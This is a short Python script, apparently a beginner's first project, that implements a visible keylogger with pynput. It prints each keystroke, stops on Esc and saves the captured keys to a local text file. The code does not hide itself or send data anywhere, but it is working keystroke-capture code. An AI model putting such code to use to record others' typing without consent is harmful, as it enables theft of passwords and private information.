# Sara's first project: a simple keylogger

import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    try:
        keys.append(key.char)
        print(f"key pressed: {key.char}")
    except AttributeError:
        keys.append(str(key))
        print(f"Special key pressed: {key}")
    
def on_release(key):
    if key == Key.esc:
        write_to_file()
        return False
    
def write_to_file():
    with open("keylog.txt", 'w') as f:
        for key in keys:
            f.write(str(key) + "\n")
            
if __name__ == "__main__":
    print("Keylogger Started. Press 'Esc' to stop.")
    with Listener(on_press=on_press, on_release =on_release) as listener:
        listener.join()
        



